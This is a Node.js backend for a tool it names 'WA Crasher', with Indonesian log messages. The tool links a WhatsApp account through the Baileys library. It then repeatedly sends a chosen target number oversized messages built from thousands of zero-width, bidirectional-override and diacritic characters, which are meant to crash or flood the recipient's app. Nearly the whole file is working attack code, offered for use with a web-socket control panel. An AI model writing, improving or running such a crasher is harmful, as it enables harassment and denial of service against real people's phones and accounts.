const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { makeWASocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
const cors = require('cors');

const app = express();
app.use(cors({ origin: '*' }));

const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: '*', methods: ['GET', 'POST'] },
    transports: ['websocket', 'polling']
});

let sock = null;
let isReady = false;

const PAYLOADS = {
    0: '\u200B\u200C\u200D\uFEFF\u2060\u2063'.repeat(5000),
    1: '\u202E\u202D\u2066\u2067\u2068\u2069'.repeat(5000),
    2: '\u064E\u064F\u0650\u0651\u0652'.repeat(6000),
    3: '\u200B'.repeat(20000)
};

async function connectWA() {
    try {
        const { state, saveCreds } = await useMultiFileAuthState('baileys-session');
        
        sock = makeWASocket({
            auth: state,
            browser: ['WA Crasher', 'Chrome', '1.0'],
            printQRInTerminal: false
        });

        sock.ev.on('connection.update', (update) => {
            const { connection, qr } = update;
            
            if (qr) {
                console.log('QR received');
                io.emit('qr', qr);
            }
            
            if (connection === 'open') {
                isReady = true;
                io.emit('ready');
                console.log('WhatsApp connected!');
            }
            
            if (connection === 'close') {
                isReady = false;
                io.emit('disconnected');
                console.log('Connection closed, retrying...');
                setTimeout(connectWA, 5000);
            }
        });

        sock.ev.on('creds.update', saveCreds);

    } catch (e) {
        console.error('Connect error:', e.message);
        setTimeout(connectWA, 5000);
    }
}

io.on('connection', (socket) => {
    console.log('Client connected:', socket.id);

    socket.on('requestPairing', async (num) => {
        try {
            if (!sock) return socket.emit('pairingError', 'WA belum siap');
            const code = await sock.requestPairingCode(num);
            socket.emit('pairingCode', code);
        } catch(e) {
            socket.emit('pairingError', e.message);
        }
    });

    socket.on('send', async (data) => {
        if (!isReady || !sock) {
            socket.emit('log', { type: 'err', msg: 'WA belum terhubung!' });
            return;
        }

        const target = data.target.replace(/[^0-9]/g, '');
        const jid = target + '@s.whatsapp.net';
        const payload = PAYLOADS[data.payloadIdx] || PAYLOADS[0];

        socket.emit('log', { type: 'warn', msg: `Target: ${target} | ${data.count} pesan` });

        for (let i = 0; i < data.count; i++) {
            try {
                await sock.sendMessage(jid, { text: payload });
                socket.emit('log', { type: 'ok', msg: `[${i+1}/${data.count}] Sent` });
            } catch(e) {
                socket.emit('log', { type: 'err', msg: `Error: ${e.message}` });
                break;
            }
            socket.emit('progress', { current: i+1, total: data.count });
            if (i < data.count - 1) await new Promise(r => setTimeout(r, 800));
        }

        socket.emit('done');
        socket.emit('log', { type: 'ok', msg: 'Selesai!' });
    });

    socket.on('disconnect', () => console.log('Client disconnected'));
});

// Health check
app.get('/', (req, res) => res.send('WA Backend Running'));

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log('Server running on port ' + PORT);
    connectWA();
});
